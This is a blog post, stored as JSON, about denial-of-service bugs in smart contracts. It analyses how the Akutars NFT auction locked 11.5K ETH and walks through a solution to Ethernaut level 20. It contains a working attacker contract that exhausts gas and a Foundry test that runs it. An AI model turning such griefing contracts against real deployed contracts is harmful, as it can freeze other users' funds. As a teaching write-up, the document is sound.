{
  "title": "DDoS attack",
  "date": "2023-05-10T00:00:00Z",
  "modifiedTime": "2023-05-10T00:00:00Z",
  "summary": "Akutar NFT incidand an example of DDoS attack from Ethernaut.",
  "image": "blogs/blockchain/dos/cover.webp",
  "body": {
    "raw": "\n# The Akutars project and 11.5K ETH \"burn\"\n\n[Akutars](https://www.aku.world) or AkuDreams was an NFT project launched in April 2022. The original Akutars' smart contracts are at:\n\n- [AkuAuction (auction contract)](https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code)\n- [Akutar (NFT contract)](https://etherscan.io/address/0xaad35c2dadbe77f97301617d82e661776c891fa9#code)\n\n```solidity\npragma solidity ^0.8.13;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\n\ninterface akuNFT {\n  function airdropProgress() external view returns (uint256);\n}\n\ncontract AkuAuction is Ownable {\n  using Strings for uint256;\n\n  address payable immutable project;\n\n  uint256 public maxNFTs = 15000;\n  uint256 public totalForAuction = 5495; //529 + 2527 + 6449\n\n  struct bids {\n    address bidder;\n    uint80 price;\n    uint8 bidsPlaced;\n    uint8 finalProcess; //0: Not processed, 1: refunded, 2: withdrawn\n  }\n\n  uint256 private constant DURATION = 126 minutes;\n  uint256 public immutable startingPrice;\n  uint256 public immutable startAt;\n  uint256 public expiresAt;\n  uint256 public immutable discountRate;\n  mapping(address => uint256) public mintPassOwner;\n  uint256 public constant mintPassDiscount = 0.5 ether;\n  mapping(address => uint256) public personalBids;\n  mapping(uint256 => bids) public allBids;\n  uint256 public bidIndex = 1;\n  uint256 public totalBids;\n  uint256 public totalBidValue;\n  uint256 public maxBids = 3;\n  uint256 public refundProgress = 1;\n\n  akuNFT public akuNFTs;\n\n  constructor(\n    address _project,\n    uint256 startingTime,\n    uint256 _startingPrice,\n    uint256 _discountRate\n  ) {\n    project = payable(_project);\n\n    startingPrice = _startingPrice;\n    startAt = startingTime;\n    expiresAt = startAt + DURATION;\n    discountRate = _discountRate;\n\n    require(_startingPrice >= _discountRate * (DURATION / 6 minutes), \"Starting price less than minimum\");\n  }\n\n  function getPrice() public view returns (uint80) {\n    uint256 currentTime = block.timestamp;\n    if (currentTime > expiresAt) currentTime = expiresAt;\n    uint256 timeElapsed = (currentTime - startAt) / 6 minutes;\n    uint256 discount = discountRate * timeElapsed;\n    return uint80(startingPrice - discount);\n  }\n\n  function bid(uint8 amount) external payable {\n    _bid(amount, msg.value);\n  }\n\n  receive() external payable {\n    revert(\"Please use the bid function\");\n  }\n\n  function _bid(uint8 amount, uint256 value) internal {\n    require(block.timestamp > startAt, \"Auction not started yet\");\n    require(block.timestamp < expiresAt, \"Auction expired\");\n    uint80 price = getPrice();\n    uint256 totalPrice = price * amount;\n    if (value < totalPrice) {\n      revert(\"Bid not high enough\");\n    }\n\n    uint256 myBidIndex = personalBids[msg.sender];\n    bids memory myBids;\n    uint256 refund;\n\n    if (myBidIndex > 0) {\n      myBids = allBids[myBidIndex];\n      refund = myBids.bidsPlaced * (myBids.price - price);\n    }\n    uint256 _totalBids = totalBids + amount;\n    myBids.bidsPlaced += amount;\n\n    if (myBids.bidsPlaced > maxBids) {\n      revert(\"Bidding limits exceeded\");\n    }\n\n    if (_totalBids > totalForAuction) {\n      revert(\"Auction Full\");\n    } else if (_totalBids == totalForAuction) {\n      expiresAt = block.timestamp; //Auction filled\n    }\n\n    myBids.price = price;\n\n    if (myBidIndex > 0) {\n      allBids[myBidIndex] = myBids;\n    } else {\n      myBids.bidder = msg.sender;\n      personalBids[msg.sender] = bidIndex;\n      allBids[bidIndex] = myBids;\n      bidIndex++;\n    }\n\n    totalBids = _totalBids;\n    totalBidValue += totalPrice;\n\n    refund += value - totalPrice;\n    if (refund > 0) {\n      (bool sent, ) = msg.sender.call{ value: refund }(\"\");\n      require(sent, \"Failed to refund bidder\");\n    }\n  }\n\n  function loadMintPassOwners(address[] calldata owners, uint256[] calldata amounts) external onlyOwner {\n    for (uint256 i = 0; i < owners.length; i++) {\n      mintPassOwner[owners[i]] = amounts[i];\n    }\n  }\n\n  function myBidCount(address user) public view returns (uint256) {\n    return allBids[personalBids[user]].bidsPlaced;\n  }\n\n  function myBidData(address user) external view returns (bids memory) {\n    return allBids[personalBids[user]];\n  }\n\n  function setNFTContract(address _contract) external onlyOwner {\n    akuNFTs = akuNFT(_contract);\n  }\n\n  function emergencyWithdraw() external {\n    require(block.timestamp > expiresAt + 3 days, \"Please wait for airdrop period.\");\n\n    bids memory bidData = allBids[personalBids[msg.sender]];\n    require(bidData.bidsPlaced > 0, \"No bids placed\");\n    require(bidData.finalProcess == 0, \"Refund already processed\");\n\n    allBids[personalBids[msg.sender]].finalProcess = 2;\n    (bool sent, ) = bidData.bidder.call{ value: bidData.price * bidData.bidsPlaced }(\"\");\n    require(sent, \"Failed to refund bidder\");\n  }\n\n  function processRefunds() external {\n    require(block.timestamp > expiresAt, \"Auction still in progress\");\n    uint256 _refundProgress = refundProgress;\n    uint256 _bidIndex = bidIndex;\n    require(_refundProgress < _bidIndex, \"Refunds already processed\");\n\n    uint256 gasUsed;\n    uint256 gasLeft = gasleft();\n    uint256 price = getPrice();\n\n    for (uint256 i = _refundProgress; gasUsed < 5000000 && i < _bidIndex; i++) {\n      bids memory bidData = allBids[i];\n      if (bidData.finalProcess == 0) {\n        uint256 refund = (bidData.price - price) * bidData.bidsPlaced;\n        uint256 passes = mintPassOwner[bidData.bidder];\n        if (passes > 0) {\n          refund += mintPassDiscount * (bidData.bidsPlaced < passes ? bidData.bidsPlaced : passes);\n        }\n        allBids[i].finalProcess = 1;\n        if (refund > 0) {\n          (bool sent, ) = bidData.bidder.call{ value: refund }(\"\");\n          require(sent, \"Failed to refund bidder\");\n        }\n      }\n\n      gasUsed += gasLeft - gasleft();\n      gasLeft = gasleft();\n      _refundProgress++;\n    }\n\n    refundProgress = _refundProgress;\n  }\n\n  function claimProjectFunds() external onlyOwner {\n    require(block.timestamp > expiresAt, \"Auction still in progress\");\n    require(refundProgress >= totalBids, \"Refunds not yet processed\");\n    require(akuNFTs.airdropProgress() >= totalBids, \"Airdrop not complete\");\n\n    (bool sent, ) = project.call{ value: address(this).balance }(\"\");\n    require(sent, \"Failed to withdraw\");\n  }\n\n  function getAuctionDetails(address user)\n    external\n    view\n    returns (\n      uint256 remainingNFTs,\n      uint256 expires,\n      uint256 currentPrice,\n      uint256 userBids\n    )\n  {\n    remainingNFTs = totalForAuction - totalBids;\n    expires = expiresAt;\n    currentPrice = getPrice();\n    if (user != address(0)) userBids = allBids[personalBids[user]].bidsPlaced;\n  }\n}\n```\n\n<Annotation caption=\"Akutar Auction contract\" />\n\n```solidity\n//SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol\";\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\n\n/*\nAkutar.sol\n\nWritten by: mousedev.eth\nContributions by: manifold.xyz\nPublic Repository: https://github.com/mouse-dev-1/Akutar\n\n15,000 NFTs in 4 sections\n\n(6) ID 1-6 partner reserved NFTs\n\n(529) ID 7-535 Mega OG Akutars, randomly assigned to 529 Mega OG Mint Pass holders (addresses known)\n\n(2527) ID 536-3,062 OG Akutars, randomly assigned to 2,527 OG Mint Pass holders (addresses known)\n\n(11938) ID 3,063-15,000 Akutars, randomly assigned to 6,443 Mint Pass holders + 5495 public bids (addresses known)\n\n*/\n\ncontract Akutar is Ownable, ERC721, ERC721Burnable {\n    //Contract URI\n    string public CONTRACT_URI;\n\n    //Base URI\n    string public BASE_URI;\n\n    //Shift Quantity;\n    uint256 public shiftQuantity;\n\n    //Block to base randomness off of\n    uint256 blockToUse;\n\n    uint256 _totalSupply;\n\n    //Provenance hash\n    string public PROVENANCE_HASH;\n\n    //Struct to define a grouping of airdrops\n    struct Grouping {\n        uint256 startingIndex;\n        uint256 endingIndex;\n        uint256 minted;\n    }\n\n    //Mapping of groupingId to grouping struct.\n    mapping(uint256 => Grouping) public airdropGroupings;\n\n    // EIP2981\n    uint256 private _royaltyBps;\n    address payable private _royaltyRecipient;\n    bytes4 private constant _INTERFACE_ID_ROYALTIES_EIP2981 = 0x2a55205a;\n\n    constructor() ERC721(\"Akutars\", \"AKU\") {\n        //Partner\n        airdropGroupings[0] = Grouping(1, 7, 0);\n\n        //Mega OG\n        airdropGroupings[1] = Grouping(7, 536, 0);\n\n        //OG\n        airdropGroupings[2] = Grouping(536, 3063, 0);\n\n        //Normal\n        airdropGroupings[3] = Grouping(3063, 15001, 0);\n    }\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId)\n        public\n        view\n        virtual\n        override(ERC721)\n        returns (bool)\n    {\n        return super.supportsInterface(interfaceId) || interfaceId == _INTERFACE_ID_ROYALTIES_EIP2981;\n    }\n\n    function airdrop(uint256 airdropGrouping, address[] memory addresses)\n        public\n        onlyOwner\n    {\n        require(shiftQuantity > 0, \"Not yet shifted!\");\n\n        Grouping memory thisGrouping = airdropGroupings[airdropGrouping];\n\n        //Total tokens in this grouping.\n        uint256 maxQuantityWithinThisGrouping = (thisGrouping.endingIndex -\n            thisGrouping.startingIndex);\n\n        //How much to shift within these constraints.\n        uint256 shiftQuantityWithinThisGrouping = shiftQuantity %\n            maxQuantityWithinThisGrouping;\n\n        //Index to currently start on.\n        uint256 startingIndexWithinThisGrouping = thisGrouping.startingIndex +\n            thisGrouping.minted +\n            shiftQuantityWithinThisGrouping;\n\n        require(\n            thisGrouping.minted + addresses.length <=\n                maxQuantityWithinThisGrouping,\n            \"Would overflow grouping\"\n        );\n\n        //Cast to thisId\n        uint256 currentId = startingIndexWithinThisGrouping;\n\n        for (uint256 i = 0; i < addresses.length; i++) {\n            //If we are over the endingIndex because of the shuffle, adjust to current position minus max quantity;\n            if (currentId >= thisGrouping.endingIndex)\n                currentId = currentId - maxQuantityWithinThisGrouping;\n\n            //Mint thisId\n            _mint(addresses[i], currentId);\n\n            //Increment ID by one.\n            currentId++;\n        }\n\n        _totalSupply += addresses.length;\n        airdropGroupings[airdropGrouping].minted += addresses.length;\n    }\n\n    function commit(string memory _provenanceHash) external onlyOwner {\n        //Require shift hasn't happened\n        require(blockToUse == 0, \"Already committed!\");\n\n        //Set the block to use as 5 blocks from now\n        blockToUse = block.number + 5;\n\n        //Set the provenance hash\n        PROVENANCE_HASH = _provenanceHash;\n    }\n\n    function reveal() external onlyOwner {\n        //Require they have committed\n        require(blockToUse != 0, \"You have yet to commit\");\n\n        //Require shift hasn't happened\n        require(shiftQuantity == 0, \"Already shifted!\");\n\n        //Require it is at or beyond blockToUse\n        require(\n            block.number >= blockToUse,\n            \"Not enough time has passed to reveal\"\n        );\n\n        //set shift quantity\n        shiftQuantity = uint256(blockhash(blockToUse));\n    }\n\n\n    function setBaseURI(string memory _baseURI) public onlyOwner {\n        BASE_URI = _baseURI;\n    }\n\n    function setContractURI(string memory _contractURI) public onlyOwner {\n        CONTRACT_URI = _contractURI;\n    }\n\n    function contractURI() public view returns (string memory) {\n        return CONTRACT_URI;\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function tokenURI(uint256 _tokenId)\n        public\n        view\n        override\n        returns (string memory)\n    {\n        require(_exists(_tokenId), \"Token does not exist.\");\n\n        return\n            string(\n                abi.encodePacked(BASE_URI, Strings.toString(_tokenId), \".json\")\n            );\n    }\n\n    /**\n     * ROYALTY FUNCTIONS\n     */\n    function updateRoyalties(address payable recipient, uint256 bps) external onlyOwner {\n        _royaltyRecipient = recipient;\n        _royaltyBps = bps;\n    }\n\n    function royaltyInfo(uint256, uint256 value) external view returns (address, uint256) {\n        return (_royaltyRecipient, value*_royaltyBps/10000);\n    }\n}\n```\n\n<Annotation caption=\"Akutar token (NFT) contract\" />\n\nIn the auction contract, there was a software bug that make `claimProjectFunds()` to be stuck forever.\nOn top of that, there also an error that could stop `processRefunds()` (hence Denial of Service or DoS).\n\n## Bug 01 - processRefunds\n\nLet's look at the `_bid()` and `processRefunds()` function below, the authors original intent is clearly to match:\n\n- `totalBids` => number of NFTs bidded during the auction.\n- `bidIndex` => index of bidder (0-indexed) for the auction.\n- `refundProgress` => number of **people (tracked by bidIndex)** have refunded so far\n\n```solidity\nfunction _bid(uint8 amount, uint256 value) internal {\n  require(block.timestamp > startAt, \"Auction not started yet\");\n  require(block.timestamp < expiresAt, \"Auction expired\");\n  uint80 price = getPrice();\n  uint256 totalPrice = price * amount;\n  if (value < totalPrice) {\n    revert(\"Bid not high enough\");\n  }\n\n  uint256 myBidIndex = personalBids[msg.sender];\n  bids memory myBids;\n  uint256 refund;\n\n  if (myBidIndex > 0) {\n    myBids = allBids[myBidIndex];\n    refund = myBids.bidsPlaced * (myBids.price - price);\n  }\n  uint256 _totalBids = totalBids + amount;\n  myBids.bidsPlaced += amount;\n\n  if (myBids.bidsPlaced > maxBids) {\n    revert(\"Bidding limits exceeded\");\n  }\n\n  if (_totalBids > totalForAuction) {\n    revert(\"Auction Full\");\n  } else if (_totalBids == totalForAuction) {\n    expiresAt = block.timestamp; //Auction filled\n  }\n\n  myBids.price = price;\n\n  if (myBidIndex > 0) {\n    allBids[myBidIndex] = myBids;\n  } else {\n    myBids.bidder = msg.sender;\n    personalBids[msg.sender] = bidIndex;\n    allBids[bidIndex] = myBids;\n    bidIndex++;\n  }\n\n  totalBids = _totalBids;\n  totalBidValue += totalPrice;\n\n  refund += value - totalPrice;\n  if (refund > 0) {\n    (bool sent, ) = msg.sender.call{ value: refund }(\"\");\n    require(sent, \"Failed to refund bidder\");\n  }\n}\n```\n\n<Annotation caption=\"bid function [line 75]\" />\n\n```solidity\nfunction processRefunds() external {\n  require(block.timestamp > expiresAt, \"Auction still in progress\");\n  uint256 _refundProgress = refundProgress;\n  uint256 _bidIndex = bidIndex;\n  require(_refundProgress < _bidIndex, \"Refunds already processed\");\n\n  uint256 gasUsed;\n  uint256 gasLeft = gasleft();\n  uint256 price = getPrice();\n\n  for (uint256 i = _refundProgress; gasUsed < 5000000 && i < _bidIndex; i++) {\n    bids memory bidData = allBids[i];\n    if (bidData.finalProcess == 0) {\n      uint256 refund = (bidData.price - price) * bidData.bidsPlaced;\n      uint256 passes = mintPassOwner[bidData.bidder];\n      if (passes > 0) {\n        refund += mintPassDiscount * (bidData.bidsPlaced < passes ? bidData.bidsPlaced : passes);\n      }\n      allBids[i].finalProcess = 1;\n      if (refund > 0) {\n        (bool sent, ) = bidData.bidder.call{ value: refund }(\"\");\n        require(sent, \"Failed to refund bidder\");\n      }\n    }\n\n    gasUsed += gasLeft - gasleft();\n    gasLeft = gasleft();\n    _refundProgress++;\n  }\n\n  refundProgress = _refundProgress;\n}\n```\n\n<Annotation caption=\"processRefunds function [line 156]\" />\n\nOn **_line 22_** of `processRefunds()`, a require statement is used. This could revert the whole transaction whenever _a single refund failed_.\nA Denial of Service attack that forever stop `processFunds()` could be conduct in the following manner:\n\n1. A smart contract, i.e. `AttackerContract`, participate in auction and mint some NFTs (permissible from given source code) at a suitable index.\n2. The contract implements a `receive()` function that always revert => `processRefunds()` will revert at `AttackerContract`'s bidding index.\n3. Other bidder won't be able to get their refunds as `processRefunds()` always revert and `refundProgress` will be stuck forever.\n\n## Bug 02: claimProjectFunds\n\nThis is a much more naive mistake by AkuDream's team. In `claimProjectFunds()` **_line 3-4_**, `refundProgress` should keep track of `bidIndex` instead of `totalBids`.\nTherefore, this function will never work as the project sold out, and `refundProgress` is always smaller than `totalBids`.\nAs a consequence, 11,539.5 ETH is stuck forever in the [AkuAuction contract](https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code)\n\n```solidity\nfunction claimProjectFunds() external onlyOwner {\n  require(block.timestamp > expiresAt, \"Auction still in progress\");\n  require(refundProgress >= totalBids, \"Refunds not yet processed\");\n  require(akuNFTs.airdropProgress() >= totalBids, \"Airdrop not complete\");\n\n  (bool sent, ) = project.call{ value: address(this).balance }(\"\");\n  require(sent, \"Failed to withdraw\");\n}\n```\n\n# Ethernaut Level 20 - DoS attack\n\n[This level](https://ethernaut.openzeppelin.com/level/20) of Ethernaut introduce Denial of Service attack.\nPass this level by denying the `Denial` contract owner from withdrawing funds (whilst the contract still has funds, and the transaction is of 1M gas or less).\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract Denial {\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\n    address public constant owner = address(0xA9E);\n    uint timeLastWithdrawn;\n    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    // withdraw 1% to recipient and 1% to owner\n    function withdraw() public {\n        uint amountToSend = address(this).balance / 100;\n        // perform a call without checking return\n        // The recipient can revert, the owner will still get their share\n        partner.call{value:amountToSend}(\"\");\n        payable(owner).transfer(amountToSend);\n        // keep track of last withdrawal time\n        timeLastWithdrawn = block.timestamp;\n        withdrawPartnerBalances[partner] +=  amountToSend;\n    }\n\n    // allow deposit of funds\n    receive() external payable {}\n\n    // convenience function\n    function contractBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n```\n\n## Strategy analysis\n\nA few keynotes from the `Denial` contract:\n\n- `setWithdrawPartner` is public\n- withdraw partner is not limited to EOA (can be a smart contract).\n\nIn order to stop owner from withdrawing funds, one of the following must happen:\n\n1. the call to `withdraw()` is reverted.\n2. fund is exhausted before owner receive their share (line 20) => impractical since withdraw 1% balance each time.\n\nFor the 1st case, withdrawal partner receive their share by a low-level `call` statement on **_line 19_**.\nTherefore making this call failed, i.e. a simple `revert()` or `assert(false)` statement, won't do the trick.\nInstead, the partner contract need to:\n\n- execute `while(true) { <some_statement>; }` to consume all gas => OutOfGas reversal error.\n- OR perform re-entrancy on `withdraw()` => exhaust the call stack by consuming all gas => same OutOfGas error.\n\n## Implementation\n\nCreate an attacker contract as follow:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport \"./Denial.sol\";\n\ncontract DenialAttack {\n  uint256 i;\n  Denial DenialContract;\n\n  constructor(address payable denialAddr) {\n    DenialContract = Denial(denialAddr);\n  }\n\n  function attack() public {\n    DenialContract.setWithdrawPartner(address(this));\n  }\n\n  receive() external payable {\n    while (true) {\n      i += 1;\n    }\n  }\n}\n```\n\nThen a flow of this attack is:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"~/DoS/Denial.sol\";\nimport \"~/DoS/DenialAttack.sol\";\n\ncontract DenialTest is Test {\n  address owner = vm.addr(1);\n  address hacker = vm.addr(2);\n\n  function setUp() public {}\n\n  function testReentranceAttack() public {\n    uint256 initialGas = gasleft();\n    vm.startPrank(owner);\n    Denial DenialContract = new Denial();\n    address payable denialAddr = payable(address(DenialContract));\n    vm.deal(denialAddr, 100 ether); // Deal 100 ether to the Denial contract.\n    DenialContract.setWithdrawPartner(hacker);\n\n    // verify that withdraw is successful.\n    DenialContract.withdraw();\n    assertEq(owner.balance, 1 ether, \"owner balance should be 1 ETH\");\n    assertEq(hacker.balance, 1 ether, \"hacker (current partner) balance should be 1 ETH\");\n    vm.stopPrank();\n\n    // Hacker exploit the smart contract.\n    vm.startPrank(hacker);\n    DenialAttack exploiterContract = new DenialAttack(denialAddr);\n    exploiterContract.attack();\n    assertEq(DenialContract.partner(), address(exploiterContract)); // confirm withdraw partner\n    vm.stopPrank();\n\n    // Simulate a hypothetical \"infinite\" gas limit, transaction revert \"OutOfGas\".\n    uint256 INFINITE_GAS = 30_000_000;\n    vm.expectRevert(\"Out of Gas\");\n    vm.prank(owner);\n    (bool result, ) = denialAddr.call{ gas: INFINITE_GAS }(abi.encodeWithSignature(\"withdraw()\"));\n    uint256 gasUsed = initialGas - gasleft();\n    assert(!result && gasUsed > INFINITE_GAS);\n  }\n}\n```\n\n## Preventation\n\nFor the specific example from Ethernaut lvl 20, we can:\n\n1. Guard from re-entrancy, [see](https://philho.xyz/blog/smart_contract/reentrance_attack)\n2. Restrict `setWithdrawPartner` to:\n\n- contract owner (then choose trusted partner) OR\n- EOA only, e.g. [consensys note](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)\n\n# Conclusion\n\nIn conclusion, DDoS attacks pose a significant threat to smart contracts.\nProtecting against DDoS attacks involves implementing measures specific to each contract's requirements.\n\nIt's important to note that DDoS vulnerabilities often stem from flawed logic within the contract itself.\nTherefore, it's best to use fool-proof functions and have a good understand of EVM calls.\n\n# References\n\n1. [How Akutar NFT loses 34M USD](https://blocksecteam.medium.com/how-akutar-nft-loses-34m-usd-60d6cb053dff)\n2. [AkuAuction (auction contract)](https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code)\n3. [Akutar (NFT contract)](https://etherscan.io/address/0xaad35c2dadbe77f97301617d82e661776c891fa9#code)\n4. [Ethernaut level 20](https://ethernaut.openzeppelin.com/level/20)\n5. [Level 20 is no lonnger solvable by assert(false)](https://ethereum.stackexchange.com/a/113362)\n6. [Foundry cheatcodes reference](https://book.getfoundry.sh/cheatcodes/)\n",
    "code": "var Component=(()=>{var cn=Object.create;var O=Object.defineProperty;var ln=Object.getOwnPropertyDescriptor;var un=Object.getOwnPropertyNames;var mn=Object.getPrototypeOf,bn=Object.prototype.hasOwnProperty;var $=(c,n)=>()=>(n||c((n={exports:{}}).exports,n),n.exports),fn=(c,n)=>{for(var b in n)O(c,b,{get:n[b],enumerable:!0})},ye=(c,n,b,N)=>{if(n&&typeof n==\"object\"||typeof n==\"function\")for(let g of un(n))!bn.call(c,g)&&g!==b&&O(c,g,{get:()=>n[g],enumerable:!(N=ln(n,g))||N.enumerable});return c};var _n=(c,n,b)=>(b=c!=null?cn(mn(c)):{},ye(n||!c||!c.__esModule?O(b,\"default\",{value:c,enumerable:!0}):b,c)),pn=c=>ye(O({},\"__esModule\",{value:!0}),c);var ve=$((vn,we)=>{we.exports=React});var je=$(z=>{\"use strict\";(function(){\"use strict\";var c=ve(),n=Symbol.for(\"react.element\"),b=Symbol.for(\"react.portal\"),N=Symbol.for(\"react.fragment\"),g=Symbol.for(\"react.strict_mode\"),H=Symbol.for(\"react.profiler\"),Q=Symbol.for(\"react.provider\"),X=Symbol.for(\"react.context\"),T=Symbol.for(\"react.forward_ref\"),S=Symbol.for(\"react.suspense\"),C=Symbol.for(\"react.suspense_list\"),R=Symbol.for(\"react.memo\"),F=Symbol.for(\"react.lazy\"),Re=Symbol.for(\"react.offscreen\"),K=Symbol.iterator,Ee=\"@@iterator\";function Ae(e){if(e===null||typeof e!=\"object\")return null;var r=K&&e[K]||e[Ee];return typeof r==\"function\"?r:null}var w=c.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED;function f(e){{for(var r=arguments.length,i=new Array(r>1?r-1:0),s=1;s<r;s++)i[s-1]=arguments[s];Ie(\"error\",e,i)}}function Ie(e,r,i){{var s=w.ReactDebugCurrentFrame,d=s.getStackAddendum();d!==\"\"&&(r+=\"%s\",i=i.concat([d]));var l=i.map(function(a){return String(a)});l.unshift(\"Warning: \"+r),Function.prototype.apply.call(console[e],console,l)}}var De=!1,Be=!1,Oe=!1,Se=!1,Ce=!1,Z;Z=Symbol.for(\"react.module.reference\");function Fe(e){return!!(typeof e==\"string\"||typeof e==\"function\"||e===N||e===H||Ce||e===g||e===S||e===C||Se||e===Re||De||Be||Oe||typeof e==\"object\"&&e!==null&&(e.$$typeof===F||e.$$typeof===R||e.$$typeof===Q||e.$$typeof===X||e.$$typeof===T||e.$$typeof===Z||e.getModuleId!==void 0))}function Ge(e,r,i){var s=e.displayName;if(s)return s;var d=r.displayName||r.name||\"\";return d!==\"\"?i+\"(\"+d+\")\":i}function J(e){return e.displayName||\"Context\"}function h(e){if(e==null)return null;if(typeof e.tag==\"number\"&&f(\"Received an unexpected object in getComponentNameFromType(). This is likely a bug in React. Please file an issue.\"),typeof e==\"function\")return e.displayName||e.name||null;if(typeof e==\"string\")return e;switch(e){case N:return\"Fragment\";case b:return\"Portal\";case H:return\"Profiler\";case g:return\"StrictMode\";case S:return\"Suspense\";case C:return\"SuspenseList\"}if(typeof e==\"object\")switch(e.$$typeof){case X:var r=e;return J(r)+\".Consumer\";case Q:var i=e;return J(i._context)+\".Provider\";case T:return Ge(e,e.render,\"ForwardRef\");case R:var s=e.displayName||null;return s!==null?s:h(e.type)||\"Memo\";case F:{var d=e,l=d._payload,a=d._init;try{return h(a(l))}catch{return null}}}return null}var y=Object.assign,P=0,ee,ne,te,re,ie,se,oe;function ae(){}ae.__reactDisabledLog=!0;function Ue(){{if(P===0){ee=console.log,ne=console.info,te=console.warn,re=console.error,ie=console.group,se=console.groupCollapsed,oe=console.groupEnd;var e={configurable:!0,enumerable:!0,value:ae,writable:!0};Object.defineProperties(console,{info:e,log:e,warn:e,error:e,group:e,groupCollapsed:e,groupEnd:e})}P++}}function qe(){{if(P--,P===0){var e={configurable:!0,enumerable:!0,writable:!0};Object.defineProperties(console,{log:y({},e,{value:ee}),info:y({},e,{value:ne}),warn:y({},e,{value:te}),error:y({},e,{value:re}),group:y({},e,{value:ie}),groupCollapsed:y({},e,{value:se}),groupEnd:y({},e,{value:oe})})}P<0&&f(\"disabledDepth fell below zero. This is a bug in React. Please file an issue.\")}}var G=w.ReactCurrentDispatcher,U;function E(e,r,i){{if(U===void 0)try{throw Error()}catch(d){var s=d.stack.trim().match(/\\n( *(at )?)/);U=s&&s[1]||\"\"}return`\n`+U+e}}var q=!1,A;{var We=typeof WeakMap==\"function\"?WeakMap:Map;A=new We}function de(e,r){if(!e||q)return\"\";{var i=A.get(e);if(i!==void 0)return i}var s;q=!0;var d=Error.prepareStackTrace;Error.prepareStackTrace=void 0;var l;l=G.current,G.current=null,Ue();try{if(r){var a=function(){throw Error()};if(Object.defineProperty(a.prototype,\"props\",{set:function(){throw Error()}}),typeof Reflect==\"object\"&&Reflect.construct){try{Reflect.construct(a,[])}catch(x){s=x}Reflect.construct(e,[],a)}else{try{a.call()}catch(x){s=x}e.call(a.prototype)}}else{try{throw Error()}catch(x){s=x}e()}}catch(x){if(x&&s&&typeof x.stack==\"string\"){for(var o=x.stack.split(`\n`),_=s.stack.split(`\n`),u=o.length-1,m=_.length-1;u>=1&&m>=0&&o[u]!==_[m];)m--;for(;u>=1&&m>=0;u--,m--)if(o[u]!==_[m]){if(u!==1||m!==1)do if(u--,m--,m<0||o[u]!==_[m]){var p=`\n`+o[u].replace(\" at new \",\" at \");return e.displayName&&p.includes(\"<anonymous>\")&&(p=p.replace(\"<anonymous>\",e.displayName)),typeof e==\"function\"&&A.set(e,p),p}while(u>=1&&m>=0);break}}}finally{q=!1,G.current=l,qe(),Error.prepareStackTrace=d}var j=e?e.displayName||e.name:\"\",Ne=j?E(j):\"\";return typeof e==\"function\"&&A.set(e,Ne),Ne}function Me(e,r,i){return de(e,!1)}function Le(e){var r=e.prototype;return!!(r&&r.isReactComponent)}function I(e,r,i){if(e==null)return\"\";if(typeof e==\"function\")return de(e,Le(e));if(typeof e==\"string\")return E(e);switch(e){case S:return E(\"Suspense\");case C:return E(\"SuspenseList\")}if(typeof e==\"object\")switch(e.$$typeof){case T:return Me(e.render);case R:return I(e.type,r,i);case F:{var s=e,d=s._payload,l=s._init;try{return I(l(d),r,i)}catch{}}}return\"\"}var D=Object.prototype.hasOwnProperty,ce={},le=w.ReactDebugCurrentFrame;function B(e){if(e){var r=e._owner,i=I(e.type,e._source,r?r.type:null);le.setExtraStackFrame(i)}else le.setExtraStackFrame(null)}function Ye(e,r,i,s,d){{var l=Function.call.bind(D);for(var a in e)if(l(e,a)){var o=void 0;try{if(typeof e[a]!=\"function\"){var _=Error((s||\"React class\")+\": \"+i+\" type `\"+a+\"` is invalid; it must be a function, usually from the `prop-types` package, but received `\"+typeof e[a]+\"`.This often happens because of typos such as `PropTypes.function` instead of `PropTypes.func`.\");throw _.name=\"Invariant Violation\",_}o=e[a](r,a,s,i,null,\"SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED\")}catch(u){o=u}o&&!(o instanceof Error)&&(B(d),f(\"%s: type specification of %s `%s` is invalid; the type checker function must return `null` or an `Error` but returned a %s. You may have forgotten to pass an argument to the type checker creator (arrayOf, instanceOf, objectOf, oneOf, oneOfType, and shape all require an argument).\",s||\"React class\",i,a,typeof o),B(null)),o instanceof Error&&!(o.message in ce)&&(ce[o.message]=!0,B(d),f(\"Failed %s type: %s\",i,o.message),B(null))}}}var Ve=Array.isArray;function W(e){return Ve(e)}function $e(e){{var r=typeof Symbol==\"function\"&&Symbol.toStringTag,i=r&&e[Symbol.toStringTag]||e.constructor.name||\"Object\";return i}}function ze(e){try{return ue(e),!1}catch{return!0}}function ue(e){return\"\"+e}function me(e){if(ze(e))return f(\"The provided key is an unsupported type %s. This value must be coerced to a string before before using it here.\",$e(e)),ue(e)}var k=w.ReactCurrentOwner,He={key:!0,ref:!0,__self:!0,__source:!0},be,fe,M;M={};function Qe(e){if(D.call(e,\"ref\")){var r=Object.getOwnPropertyDescriptor(e,\"ref\").get;if(r&&r.isReactWarning)return!1}return e.ref!==void 0}function Xe(e){if(D.call(e,\"key\")){var r=Object.getOwnPropertyDescriptor(e,\"key\").get;if(r&&r.isReactWarning)return!1}return e.key!==void 0}function Ke(e,r){if(typeof e.ref==\"string\"&&k.current&&r&&k.current.stateNode!==r){var 